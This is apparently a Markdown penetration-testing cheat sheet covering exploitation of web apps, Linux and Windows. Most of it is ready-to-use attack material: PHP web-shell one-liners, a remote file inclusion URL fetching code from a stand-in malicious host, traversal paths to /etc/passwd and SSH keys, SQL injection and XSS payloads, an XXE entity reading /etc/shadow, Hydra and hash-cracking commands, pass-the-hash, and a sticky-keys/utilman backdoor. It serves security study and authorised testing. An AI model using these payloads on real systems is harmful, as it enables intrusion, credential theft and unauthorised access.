# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#general)
2. [LINUX](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#linux)
3. [WINDOWS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#windows)
4. [WEB APPLICATION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#webapplication)

<br />

# GENERAL
## TABLE OF CONTENTS (GENERAL)
1. [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#basics)
2. [COMMAND INJECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#command-injection)
3. [FILE INCLUSION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#file-inclusion)
4. [PASSWORD HACKING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-hacking)
5. [SQL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#sql)
6. [XML](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xml)
7. [XSS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#xss)

## BASICS
## Info
### Use RHOST
- `rhost=[IPv4 of your target machine]`: Save time and create one variable for the Remote Host IP address
- `echo $rhost`: show the value of rhost
- `unset rhost`: clear the value of rhost

### Search Exploits
- google --> <service_name> [version] exploit
- shodan --> https://exploits.shodan.io/
- searchsploit (= ExploitDB lookup)
   - `searchsploit apache mod_ssl`
   - `searchsploit -w ftp`: show ftp exploits including web-links
- msf: `search platform:windows port:135 target:XP type:exploit`

<br />

## COMMAND INJECTION
## HowTo 
- Sequential: `/bin/exploit ; malicious_code`
- Pipeline: `/bin/exploit | malicious_code` (use output of exploit as input for malicious_code)
- Substitution: `/bin/exploit 'malicious_code'` (output of malicious_code as arg to exploit)
- Substitution: `/bin/exploit $(malicious_code)` (output of malicious_code as arg to exploit)
- Redirection: `/bin/exploit > ~/.bashrc` (overwrite bashrc)

<br />

## FILE INCLUSION
## Info
### Remote
- **Attacker uploads file from external source**
- These PHP functions are vulnerable:
    - **allow_url_include**
    - **allow_url_fopen**
    - **include() / include_once()**
    - **require() / require_once()**
- Examples:
    - Inject remote file from own server: https://example.com/login.php?user=http://malware.bad/malicious.php
    - Inject malicious script: https://example.com/login.php?user=malicious.php
- Get rid off server-side code endings:
    - Add `&blah=` or `?blah=` depending on your URL

### Local 
- **Attacker retrieves a file that already exists on hosting server**
- Null Byte Attack
   - https://example.com/login.php?user=../../Windows/system32/cmd.exe%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htaccess%00
   - http://example.com/index.html?page=../../../../../var/www/html/restricted/.htpasswd%00
   - %00 terminates string to avoid adherence of specific extension (e.g. .php)
- Base64
   - ?user=php://filter/read=convert.base64-encode/resource=/etc/passwd
   - Decode the server response separately to get target output
- Fuzzing via Burpsuite Intruder (Directory Traversal)
- LFI Suite:
   - [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)

### Best Practice
- Input Validation (Whitelisting allowed file extensions)
- Exclude the directory separators “/” 
- Patch php version regularly


## HowTo
### Code to check while enumerating RFI
- `<?php phpinfo() ?>`
- `<?php system("whoami"); ?>`
- ```<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>```
- ```<?php $c=$_GET[‘c’]; echo `$c`; ?>```
- `<?php passthru($_GET['cmd']); ?>`
- `<?php echo shell_exec("whoami");?>` For shell_exec to output the result you need to echo it

#### Files to check while enumerating LFI
- `../../../../../../../etc/passwd`
- `../../../../../../../home/<users>/.ssh/authorized_keys`
- `../../../../../../../home/<users>/.ssh/bash_history`
- To get the username of who we’re running as: `../../../../../../../proc/self/environ`
- To see what binary is running this service: `../../../../../../../proc/self/cmdline`
- index.php / config.php / settings.php / php.ini


<br />

## PASSWORD HACKING
## Info
### Rainbow Tables
- Good for LM, NTLM and MD5 Hashes without Salt or Pepper
- Less CPU power, but more storage needed (!) 
   - NTLM hash with [uppercase, lowercase, numbers] and max length of 9 chars = 690GB of space (!)

### Lookups
- Query a database with hashes and passwords
- Easiest way to crack hashes
- Difference between Lookups and Rainbow Tables:
    - Data not stored on your system (no huge disk required)
    - DB contains well known wordlist and breach data (i/o every single combination)

## HowTo
### Pass the Hash (Hash Injection Attack)
- Use dumped hashes for Authen (password not required!)
- `pth-winexe -U [targetUser] //[IPv4] [command]`
- Best Case: User-Account-Control off, Windows Firewall off
- Helpful with LM, NTLM-Authen and SSO-mechanisms

### Wordlists
1. Kali: /usr/share/wordlists (pre-installed)
2. CLI tool **crunch**
   - `crunch 4 6 abcdefg123! -o crunchlist1.txt`
   - 4 6 = word length between 4 and 6
   - abcdefg123! = use chars out of this list
3. CLI tool **cewl**
   - custom wordlist generator based on website content
   - `cewl https://cisco.com -m 6 -d 3 -w cisco.cewl`
   - -m = minimum word length
   - -d = depth of sub directories
   - -w = write
4. [https://github.com/p-arrow/SecLists/tree/master/Passwords](https://github.com/p-arrow/SecLists/tree/master/Passwords)

### John the Ripper
- Detailed examples: [https://www.openwall.com/john/doc/EXAMPLES.shtml](https://www.openwall.com/john/doc/EXAMPLES.shtml)
- Install Jumbo Patch: [Github/openwall](https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL)
- copy full user line into file and save as mypass: `victim:R7xTxLfuQeacY:19003:0:99999:7:::`
- `john mypass`: use discovered password hash from "mypass" and supply it to john 
- `john mypass --format=NAME`: Specify the hash format (descrypt/bsdicrypt/md5crypt/bcrypt/LM/AFS/tripcode/dummy/crypt)
- `john --list=formats`: show available hash formats recognized by john (**after installation of john jumbo patch**
- `john --show mypass`: show results after cracking of mypass
- `john --wordlist=cisco.cewl --rules mypass`: enable wordlist for password cracking
- `john --restore`: continue interrupted session
- `nano /etc/john/john.conf`: configuration of wordlist-rules
- results are saved under .john/john.pot (No second run with same wordlist necessary) 
- On Linux: `unshadow /etc/passwd /etc/shadow > mypasswd` ; `john mypasswd`
- For zip files use `zip2john file.zip > zip.hashes` (this generates hashes which you can crack by using `john zip.hashes`)
- For rar files use `rar2john file.rar > rar.hashes` (this generates hashes which you can crack by using `john rar.hashes`)

### Hydra
Check out: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)*

```
hydra -h ; hydra http-form-post -U (service module help)
hydra -l admin -P pw.txt "http-form-post://IPv4:80/login:username=^USER^&password=^PASS^:fail"
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

### Hashcat
Check out: [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)

1. msf: `use post/windows/gather/hash` ("run" requires admin privilege)
2. Check for NT-Hash: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
3. `hashcat -m 1000 -a 0 hash.txt /usr/share/john/password.lst`
    - `-m 1000` = hash-type NTLM
       - Other Types:
       - 900 = MD4
       - 0 = MD5
       - 100 = SHA1 
       - 3000 = LM
    - `-a 0` = attack-mode Straight
       - Other types: 
       - 1 = Combination
       - 3 = Brute-force
4. `hashcat --show hash.txt` Show cracked hashes

### pwdump/FGDump
- Dump LM/NTLM-Hash via pwdump/FGDump:
    - pwdump-structure: `<Uname>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:`
- LM Hash for "no password": 
    - "aad3b435b51404ee" "aad3b435b51404ee"

<br />

## SQL
## Info

**>> Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)**

### SQL Types
1. MySQL
2. SQL Server
3. PostgreSQL
4. Oracle
5. Others

## HowTo
### SQL Injection: Quick and Dirty
```
admin' --
admin' #
admin'/*
' or 1='1
' or 1=1--
' or 1=1#
' or 1=1/*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```
#### Comment
```
1) --
2) /*  */
3) #
```

#### Combine Queries 
- `SELECT * FROM xyz ; SELECT * FROM abc`

#### UNION injections
- You can poison query to return records from different tables
- `SELECT username, admin FROM members UNION SELECT password, admin FROM members`


### Tools
#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap
```
--> HTTP POST request: (after interception) save request to file (Burpsuite)
--> sqlmap -r request -p password (-p = analyze Parameter from POST method)
--> sqlmap -r request -D [database] --tables
--> sqlmap -r request -D [database] -T [table] --dump
--> -p "Parameter" -u "url" --tables
--> -p "Parameter" -D [DBMS] -T [Table] --dump -u "url"
```

<br />

## XML
## Info
### Missing Encryption/Input Validation
- XML data vulnerable to spoofing /request forgery / code injection

### XML Bomb
- Entities that expand to exponential size, consuming memory (DoS!)

### XML External Entity (XXE)
- Embeds a request for a local resource
- File Inclusion within XML
  - `<!ENTITY runcode SYSTEM "/etc/shadow">`

<br />

## XSS
## Info

*Attacker embeds malicious scripting commands on a trusted website*

1. **Reflected XSS**
- non-persistent effect activated by a victim clicking a link
- Example: `https://example.com/search?q=<script%20type='application/js'>alert('xss')</script>`
2. **Stored/Persistent XSS**
- Attempts to store data persistently on the web server
3. **DOM-based XSS**
- Attempt to exploit the victim's web browser
- Example: `https://example.com/index.html#default=<script>alert(document.cookie)</script>`
     
## HowTo
### Attack Patterns
- [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
```
<script>alert("XSS LEAK")</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(2)>
```

<br />

# LINUX
## TABLE OF CONTENTS (LINUX)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-linux)

## PASSWORD RECOVERY (LINUX)
## HowTo
1. Boot up, press "e" when grub loader window appears 
2. Change last Linux-row from  `ro single` to `rw init=/bin/bash` (ro = read only; rw = read write)
3. Then press Strg+X or F10
4. Start at Recovery Mode
5. Change PW of root + user via `passwd`, then reboot

<br />

# WINDOWS
## TABLE OF CONTENTS (WINDOWS)
1. [PASSWORD RECOVERY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#password-recovery-windows)
2. [PSEXEC](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#psexec)

<br />

## PASSWORD RECOVERY (WINDOWS)
## HowTo
1. Boot Windows from CD/USB --> select System repair --> CMD  Eingabeaufforderung
2. Select volume with Windows installed
   - `diskpart` > `list disk` > `sel disk [x]`
4. On Windows volume: `cd c:\Windows\System32`
5. Create backup of original utilman.exe: `move utilman.exe utilman.exe.bak`
6. Replace utilman with cmd: `copy cmd.exe utilman.exe`, exit
   - Alternative: `copy cmd.exe sethc.exe`, exit  (sethc.exe = Sticky-Key = Activation via 5x pressing "arrow key up")
   - Now, sethc/utilman with system privileges is available before login 
7. Start from HDD/SSD > select "Easier usage" at login window
8. CMD is opened and you can enter: `net user [Name] *`
9. Press 2 times Enter to create empty PW

<br />

## PSEXEC
## HowTo
### Start Registry with System-Privileges
- CMD (admin): psexec –i –d –s regedit.exe

### Remote Commands
- `psexec \\[IPv4] cmd`: to start CMD remotely
- `psexec \\[IPv4] -c "Z:\files\ccleaner.exe” cmd /S`: copy ccleaner -silent install

<br />

# WEBAPPLICATION
## TABLE OF CONTENTS (WEBAPPLICATION)
1. [PENTEST CHECKLIST](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#pentest-checklist)
2. [LESSONS LEARNED](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/3_Exploitation.md#lessons-learned)

<br />

## PENTEST CHECKLIST 
## Info
 - [Networks/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Networks/Web%20Application.md)
 - [Reconnaissance/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/1_Reconnaissance.md#web-application)


Vulnerability | Test Method
------------- | -----------
Insufficient Cache Controls | Observe headers on pages containing sensitive data
Username Enumeration | Login valid user/invalid password – then compare. Login invalid user/invalid password – then compare
Session Cookies Not Marked Secure | Observe response headers after authentication

<br />

## LEASSONS LEARNED
## HowTo
### DOM Based URL Redirection
- Look for `https://example.com/#dashboard`
- The value after `#` is accessible by Javascript
- Use `window.location.hash`
- If URL Redirection is in place you can test if a redirection to an external site is possible
- Enter `https://example.com/#www.externalsite.com`
- Activate the redirection via Javascript
- `window.location = window.location.hash.substr(1)`: use substr() to remove the '#'
- Following mitigations exist:
   - A) URL Whitelisting: `https://example.com/redirect?externalPage=1` or `https://example.com/redirect?page=dashboard`
   - B) REGEX

#### Web Server with TRACE/TRACK enabled (XST)
- Details: [https://owasp.org/Cross_Site_Tracing](https://owasp.org/www-community/attacks/Cross_Site_Tracing)
- "XST could be used as a method to steal user’s cookies via XSS"
- "This is possible even if the cookie has the “HttpOnly” flag set or exposes the user’s Authorization header"
- `curl -X TRACE www.example.org`
- `curl -X TRACE -H "Cookie: name=value" www.example.org`

